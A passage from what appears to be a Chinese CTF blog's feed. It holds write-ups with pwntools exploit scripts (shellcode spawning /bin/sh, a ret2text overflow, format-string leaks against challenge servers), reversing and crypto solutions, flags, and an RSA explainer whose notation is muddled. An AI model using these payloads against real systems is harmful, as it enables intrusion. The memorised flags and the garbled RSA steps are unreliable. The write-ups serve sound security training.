        <content type="html"><![CDATA[<p>U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI<br><img src="/images/8C5ED5D3-48AE-4A5B-94BF-527E062586AC.png"><br><a href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> Rabbit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shellcode</title>
      <link href="/2025/06/63e0052f564e.html"/>
      <url>/2025/06/63e0052f564e.html</url>
      
        <content type="html"><![CDATA[<p><img src="/./../../images/D963E729-82E8-4920-BCC6-3E43CDB31255.png"><br>检查安全机制发现 <strong>NX (No-Execute) 已启用</strong>，这意味着栈内存不可执行，因此无法直接执行栈上的 shellcode。但题目中有一个明显的 <strong>后门函数</strong>，这应该才是解题的关键。<br><img src="/./../../images/Pastedimage20250605220423.png"><br><img src="/./../../images/Pastedimage20250605220507.png"><br>也没有开啥保护。<br>logo明显提示用shellcode,所以我们需要发送sellcode。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;10.190.131.17&quot;</span>,<span class="number">62534</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./../../images/17DD8EEB-247B-4BB2-8BA3-995677E381841.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整数溢出</title>
      <link href="/2025/06/1f04604b780a.html"/>
      <url>/2025/06/1f04604b780a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/./../../images/82DBD94C-4B71-4F33-8BD4-3EECD2675F78.png"><br><img src="/./../../images/Pastedimage20250605212046.png"><br><img src="/./../../images/Pastedimage20250605212223.png"><br>这里的<strong>0 ~ 0x7fffffff</strong>就是 <strong>0~2147483647</strong> ，<br><strong>0x80000000 ~ 0xffffffff</strong>就是 <strong>-2147483648 ~ -1</strong><br><img src="/./../../images/Pastedimage20250605212238.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接服务器（根据题目提示修改端口）</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">61862</span>)  <span class="comment"># 示例端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待提示</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Enter an unsigned integer: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送目标数字</span></span><br><span class="line">p.sendline(<span class="string">b&quot;4294967295&quot;</span>)  <span class="comment"># 或 b&quot;-1&quot; 在某些环境下也可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收flag</span></span><br><span class="line"><span class="built_in">print</span>(p.recvall().decode())</span><br></pre></td></tr></table></figure><p>这道题涉及整数溢出漏洞利用，目标是通过输入特定数字触发<code>gift()</code>函数获取flag。以下是完整的解题步骤：</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li><strong>关键代码</strong>：<br> printf(“Enter an unsigned integer: “);<br> _isoc99_scanf(“%u”, &amp;v4);  &#x2F;&#x2F; 读取无符号整数<br> if (v4 &#x3D;&#x3D; -1)  &#x2F;&#x2F; -1在无符号中等于4294967295<br> gift();    &#x2F;&#x2F; 触发flag输出</li><li><strong>整数溢出原理</strong>：<ul><li><code>v4</code>是<code>unsigned int</code>类型（4字节）</li><li><code>-1</code>在内存中被解释为无符号整数的最大值：<code>0xFFFFFFFF</code>（4294967295）    </li><li>输入<code>4294967295</code>可使条件<code>v4 == -1</code>成立</li></ul></li><li><strong>防护机制</strong>：<br> Full RELRO | Canary | NX | PIE<br> 虽然防护较强，但无需绕过这些保护，因为利用不涉及栈溢出</li></ol><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><ol><li><strong>计算目标值</strong>：<br> 4294967295 &#x3D; 2³² - 1 &#x3D; 0xFFFFFFFF</li><li><strong>触发gift函数</strong>：<ul><li>当输入<code>4294967295</code>时：<br>  v4 &#x3D; 4294967295 &#x3D; 0xFFFFFFFF<br>  v4 &#x3D;&#x3D; -1 → True  &#x2F;&#x2F; 因为-1在无符号中就是0xFFFFFFFF</li><li>执行<code>system(&quot;cat /ctfshow_flag&quot;)</code><br> <img src="/images/91C4D1E4-DA5C-45B1-A1AE-72BD35872AC2.png"></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2text</title>
      <link href="/2025/06/6eb5ab8aa336.html"/>
      <url>/2025/06/6eb5ab8aa336.html</url>
      
        <content type="html"><![CDATA[<p><img src="/./../../images/53C70E9A-8E89-4C8B-95E3-7078BD55343B1.png"><br>32位<br><img src="/./../../images/Pastedimage20250605135457.png"><br>Tab键<br><img src="/./../../images/Pastedimage20250605135812.png"><br>nc一下<br><img src="/./../../images/EAFBEA4F-0F51-421C-AD17-A89910A6224D.png"><br>看pwnme函数<br><img src="/./../../images/Pastedimage20250605140015.png"><br>这里有个fgets函数<br>Tab键<br><img src="/./../../images/Pastedimage20250605140201.png"><br><strong>可以看到第一行s这个变量是在距离栈底ebp9个字节的地方</strong><br><img src="/./../../images/463C8EE2-1263-43AF-B876-7B0C4F4B928F.png"><br>题目叫stack，所以看了一下stack函数<br><img src="/./../../images/Pastedimage20250605140449.png"><br>妥妥的getshell函数<br>这段代码 system(“&#x2F;bin&#x2F;sh”) 的作用是在 Linux 系统中执行 &#x2F;bin&#x2F;sh 命令，它会打开一个新的 shell 进程。<br>具体来说，&#x2F;bin&#x2F;sh 是指向系统中的默认 shell 解释器的路径。通过执行该命令，你将进入一个新的交互式 shell 环境，可以在其中执行各种命令和操作。这对于开发者或者在某些情况下需要与系统进行交互的用户来说非常有用。</p><p>main点一下绿色<br><img src="/./../../images/Pastedimage20250605141027.png"><br>可以看到该函数地址为0x0804850F<br><img src="/./../../images/3BBE1FF3-C061-4222-B03E-C2B1AB35901F.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28308</span>)    <span class="comment">#远程连接</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)   <span class="comment">#用a字符填满前面9个字节的空白，然后再用4字节填满原来的ebp(这里为汇编基础，因为程序位32位程序）</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)                    <span class="comment">#然后p32将stack函数写入地址的四个字节</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./../../images/3D19A85A-20C8-444E-A235-C906BCB99447.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =remote(<span class="string">&quot;pwn.chall.ctf.show&quot;</span>,<span class="number">28006</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x9</span>+<span class="number">4</span>) + p32(<span class="number">0x0804850F</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ChattyParrot&#x27;</span>)</span><br><span class="line">secret_addr = <span class="number">0x4040a0</span></span><br><span class="line">offset = <span class="number">41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_exploit</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;带调试信息的漏洞利用&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 启动程序并设置环境变量</span></span><br><span class="line">        p = process(<span class="string">&#x27;./ChattyParrot&#x27;</span>, env=&#123;<span class="string">&#x27;FLAG_VAL&#x27;</span>: <span class="string">&#x27;debug_flag&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印程序启动信息</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 程序启动，pid: <span class="subst">&#123;p.pid&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 接收输入提示</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            prompt = p.recvuntil(<span class="string">b&#x27;Input your phrase:&#x27;</span>, timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 接收到提示: <span class="subst">&#123;prompt.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 未接收到输入提示，程序可能提前退出&quot;</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 构造并打印payload</span></span><br><span class="line">        payload = p64(secret_addr) + <span class="string">f&#x27;%<span class="subst">&#123;offset&#125;</span>$s&#x27;</span>.encode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] payload: <span class="subst">&#123;payload.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] payload长度: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span> 字节&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 发送payload</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 已发送payload&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 接收响应</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = p.recv(<span class="number">1024</span>, timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 接收到响应: <span class="subst">&#123;response.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;grodno&#123;&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] 成功获取FLAG: <span class="subst">&#123;response.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] 尝试交互式模式&quot;</span>)</span><br><span class="line">                p.interactive()</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 接收响应出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        p.close()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 漏洞利用出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;p&#x27;</span> <span class="keyword">in</span> <span class="built_in">locals</span>():</span><br><span class="line">            p.close()</span><br><span class="line"></span><br><span class="line">debug_exploit()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload_without_wait</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;ctf.mf.grsu.by&#x27;</span>, <span class="number">9077</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 不等待提示，直接发送payload</span></span><br><span class="line">        payload = <span class="string">b&#x27;%41$s&#x27;</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接收所有可能的数据</span></span><br><span class="line">        response = p.recvall(timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 响应: <span class="subst">&#123;response.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 文本形式: <span class="subst">&#123;response.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">send_payload_without_wait()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">grodno&#123;J35KiI_P4RR07_Drug_M47u3&#125;</span><br></pre></td></tr></table></figure><p>爆破密码zip </p><p> <code>super-secret-file.txt</code></p><p>grodno{0n_linux_it_would_be_easier_t0_do_this}</p><p>86.57.166.23</p><p>grodno{2002:5639:A617::&#x2F;48}</p><p>grodno{4374575035158325358345436}</p><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><h6 id="DECIMAL-HEXADECIMAL-DESCRIPTION"><a href="#DECIMAL-HEXADECIMAL-DESCRIPTION" class="headerlink" title="DECIMAL       HEXADECIMAL     DESCRIPTION"></a>DECIMAL       HEXADECIMAL     DESCRIPTION</h6><p>0             0x0             PNG image, 740 x 740, 8-bit&#x2F;color RGBA, non-interlaced<br>287           0x11F           Zlib compressed data, compressed</p><p>dd if&#x3D;Yin_Yang.png of&#x3D;extracted_zlib skip&#x3D;287 bs&#x3D;1 </p><p>342959+0 records in </p><p>342959+0 records out </p><p>342959 bytes (343 kB, 335 KiB) copied, 0.872282 s, 393 kB&#x2F;s</p><p>grodno{Hacker;1&#x2F;1999}</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from docx import Document</span><br><span class="line"></span><br><span class="line">visually_similar_letters = &#123;</span><br><span class="line">    &#x27;A&#x27;: (&#x27;А&#x27;, &#x27;A&#x27;), &#x27;a&#x27;: (&#x27;а&#x27;, &#x27;a&#x27;),</span><br><span class="line">    &#x27;B&#x27;: (&#x27;В&#x27;, &#x27;B&#x27;),</span><br><span class="line">    &#x27;C&#x27;: (&#x27;С&#x27;, &#x27;C&#x27;), &#x27;c&#x27;: (&#x27;с&#x27;, &#x27;c&#x27;),</span><br><span class="line">    &#x27;E&#x27;: (&#x27;Е&#x27;, &#x27;E&#x27;), &#x27;e&#x27;: (&#x27;е&#x27;, &#x27;e&#x27;),</span><br><span class="line">    &#x27;H&#x27;: (&#x27;Н&#x27;, &#x27;H&#x27;),</span><br><span class="line">    &#x27;K&#x27;: (&#x27;К&#x27;, &#x27;K&#x27;),</span><br><span class="line">    &#x27;M&#x27;: (&#x27;М&#x27;, &#x27;M&#x27;),</span><br><span class="line">    &#x27;O&#x27;: (&#x27;О&#x27;, &#x27;O&#x27;), &#x27;o&#x27;: (&#x27;о&#x27;, &#x27;o&#x27;),</span><br><span class="line">    &#x27;P&#x27;: (&#x27;Р&#x27;, &#x27;P&#x27;), &#x27;p&#x27;: (&#x27;р&#x27;, &#x27;p&#x27;),</span><br><span class="line">    &#x27;T&#x27;: (&#x27;Т&#x27;, &#x27;T&#x27;),</span><br><span class="line">    &#x27;X&#x27;: (&#x27;Х&#x27;, &#x27;X&#x27;), &#x27;x&#x27;: (&#x27;х&#x27;, &#x27;x&#x27;),</span><br><span class="line">    &#x27;Y&#x27;: (&#x27;У&#x27;, &#x27;Y&#x27;), &#x27;y&#x27;: (&#x27;у&#x27;, &#x27;y&#x27;),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Создаём обратную мапу: символ -&gt; (латиница/кириллица)</span><br><span class="line"></span><br><span class="line">char_origin = &#123;&#125;</span><br><span class="line">for pair in visually_similar_letters.values():</span><br><span class="line">    cyrillic, latin = pair</span><br><span class="line">    char_origin[cyrillic] = &#x27;0&#x27;  # 0 — кириллица</span><br><span class="line">    char_origin[latin] = &#x27;1&#x27;     # 1 — латиница</span><br><span class="line"></span><br><span class="line">def extract_bits_from_docx(path):</span><br><span class="line">    doc = Document(path)</span><br><span class="line">    bits = []</span><br><span class="line"></span><br><span class="line">    for para in doc.paragraphs:</span><br><span class="line">        for ch in para.text:</span><br><span class="line">            if ch in char_origin:</span><br><span class="line">                bits.append(char_origin[ch])</span><br><span class="line">    </span><br><span class="line">    return &#x27;&#x27;.join(bits)</span><br><span class="line"></span><br><span class="line"># Пример использования:</span><br><span class="line"></span><br><span class="line">binary_message = extract_bits_from_docx(&#x27;history.docx&#x27;)</span><br><span class="line">print(&quot;Извлечённые биты:&quot;, binary_message)</span><br><span class="line"></span><br><span class="line">def bits_to_text(bits):</span><br><span class="line">    chars = []</span><br><span class="line">    for i in range(0, len(bits), 8):</span><br><span class="line">        byte = bits[i:i+8]</span><br><span class="line">        if len(byte) == 8:</span><br><span class="line">            chars.append(chr(int(byte, 2)))</span><br><span class="line">    return &#x27;&#x27;.join(chars)</span><br><span class="line"></span><br><span class="line">hidden_text = bits_to_text(binary_message)</span><br><span class="line">print(&quot;Скрытое сообщение:&quot;, hidden_text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ELF</title>
      <link href="/2025/06/232c7fc0fbd9.html"/>
      <url>/2025/06/232c7fc0fbd9.html</url>
      
        <content type="html"><![CDATA[<p>linux也能逆？</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tea</title>
      <link href="/2025/06/e1972a9f50a5.html"/>
      <url>/2025/06/e1972a9f50a5.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250606185429.png"><br><img src="/images/Pastedimage20250606185436.png"><br><img src="/images/Pastedimage20250606185452.png"></p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单的加密</title>
      <link href="/2025/06/596e40547bb0.html"/>
      <url>/2025/06/596e40547bb0.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604161939.png"><br>shift+F12+Fn<br><img src="/images/Pastedimage20250604162108.png"><br>点击<br><img src="/images/Pastedimage20250604162142.png"><br>点击紫色的<br><img src="/images/Pastedimage20250604162209.png"><br>Tab键<br><img src="/images/25FB6DF9-3CCD-4E0E-8CCD-6A7C5D792114.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+D0h] [ebp-114h]  </span><br><span class="line">  char Str1[260]; // [esp+DCh] [ebp-108h] BYREF</span><br><span class="line">  </span><br><span class="line">  #提示用户输入 flag</span><br><span class="line">  sub_456502(&quot;Hi CTFer,Input your flag:&quot;);</span><br><span class="line">  sub_4554EF(&quot;%s&quot;, Str1);</span><br><span class="line">  </span><br><span class="line">  for ( i = 0; i &lt; j__strlen(Str1); ++i )</span><br><span class="line">    ++Str1[i]; #将每个字符的 ASCII 值加 1</span><br><span class="line">  if ( !j__strcmp(Str1, &quot;gmbh|ZPV`GJOE`JU`IBIB~&quot;) )</span><br><span class="line">    sub_456502(&quot;you are right!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_456502(&quot;you are wrong!\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对目标字符串 gmbh{ZPV<code>GJOE</code>JU<code>IBIB~&#125; 进行反向操作（每个字符减 1），得到原始输入的 flag：  每个字符减 1 后：</code>flag{YOU_FIND_IT_HAHA}&#96;</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ez_http</title>
      <link href="/2025/06/5a69eaa25605.html"/>
      <url>/2025/06/5a69eaa25605.html</url>
      
        <content type="html"><![CDATA[<p>bp抓包<br><img src="/images/3AD6ED26-D5D6-4348-AF13-B5279A3A9036.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET：?FantasyLand=0xLE4KCODE</span><br><span class="line">POST：lyc0ris=goat</span><br><span class="line"></span><br><span class="line">请求头：</span><br><span class="line">Referer: https://www.tzc.edu.cn/</span><br><span class="line">User-Agent: SansBrowser</span><br><span class="line">Cookie: user=admin</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>用hackbar也行</p>]]></content>
      
      
      <categories>
          
          <category> WEB </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>代码演示</title>
      <link href="/2025/06/5c75ebd024e9.html"/>
      <url>/2025/06/5c75ebd024e9.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> code </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>大杂烩</title>
      <link href="/2025/06/228350e34cac.html"/>
      <url>/2025/06/228350e34cac.html</url>
      
        <content type="html"><![CDATA[<p>SkpERzY0Q0ZKRlpGVTJLU0dWVUVLVFNMT1JVRkFNM1lJVkhFVzNDWUpaWVRPNkE9</p><p>base64<br>JJDG64CFJFZFU2KSGVUEKTSLORUFAM3YIVHEW3CYJZYTO6A&#x3D;<br>base32<br>JFopEIrZiR5hENKthP3xENKlXNq7x<br>xxencode<br>GMPSynt{Penml_Pelcgb}<br>Rot13<br><img src="/images/ECF67C34-79AB-4AA8-A6AF-D1D146E8F829.png"><br>TZCFlag{Crazy_Crypto}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 常见编码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RSA1</title>
      <link href="/2025/06/0208f5194904.html"/>
      <url>/2025/06/0208f5194904.html</url>
      
        <content type="html"><![CDATA[<p>p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229<br>q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469<br>dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929<br>dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041<br>c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</p><p>&#x3D;&#x3D;dp,dq  是<code>d</code>模<code>p-1</code>和<code>q-1</code>的模逆元（在RSA中，它们通常用于快速解密，因为使用它们可以避免计算<code>d</code>，这是一个大数。&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes   #将长整数转化为字节字符串</span><br><span class="line"> </span><br><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br><span class="line"> </span><br><span class="line">I = gmpy2.invert(q, p) </span><br><span class="line"> # 计算了q模p的模逆元。在数学上，这意味着I是一个整数，使得q * I mod p = 1。注意，这里的I并不是中国剩余定理中常用的h（h是p模q的模逆元），但在这个上下文中，我们只需要I</span><br><span class="line"> </span><br><span class="line">mp = pow(c, dp, p)   #使用模幂运算，计算c的dp次方模p的结果。</span><br><span class="line">mq = pow(c, dq, q)   #使用模幂运算，计算c的dq次方模q的结果。</span><br><span class="line"> </span><br><span class="line">m = (((mp-mq) * I) % p) * q + mq      #CRT的一个变种，用于从mp和mq中恢复明文m</span><br><span class="line"> </span><br><span class="line">print(long_to_bytes(m))    #解密后的整数m转换为字节字符串并输出 </span><br></pre></td></tr></table></figure><p> b’noxCTF{W31c0m3_70_Ch1n470wn}’→flag{W31c0m3_70_Ch1n470wn}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>r4</title>
      <link href="/2025/06/e37fae821c0c.html"/>
      <url>/2025/06/e37fae821c0c.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原理</title>
      <link href="/2025/06/1020b887dd37.html"/>
      <url>/2025/06/1020b887dd37.html</url>
      
        <content type="html"><![CDATA[<p><strong>密钥计算方法</strong><br>1.选择两个大素数p和q(典型值为1024位)<br>2.计算<code>n=p×q</code>和<code>z=(p-1)×(q-1)</code><br>&#x2F;&#x2F; n表示欧拉函数<br>3.选择一个与z互质的数，令其为d<br>4.找到一个 e 使满足<code>exd= 1 (mod z)</code><br>5.公开密钥为<code>(e，m)</code>，私有密钥为<code>(d，m)</code><br><strong>密钥举例</strong><br>代码如下（示例）：1.假设需要加密的明文信息为m&#x3D;85，选择：e&#x3D;7，p&#x3D;11，q&#x3D;13，说明使用RSA算法的加密和解密(计算密文并还原)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n=p*q=11*13=143</span><br><span class="line">z=（p-1）*（q-1）=10*12=120</span><br><span class="line"></span><br><span class="line">e*d=1(mod z)  </span><br><span class="line">7 * d( mod 120)=1  -------d=103</span><br></pre></td></tr></table></figure><p>1️⃣加密运算<br>公钥:(e,n)&#x3D;(7,143)<br>密文c&#x3D;p^e (mod 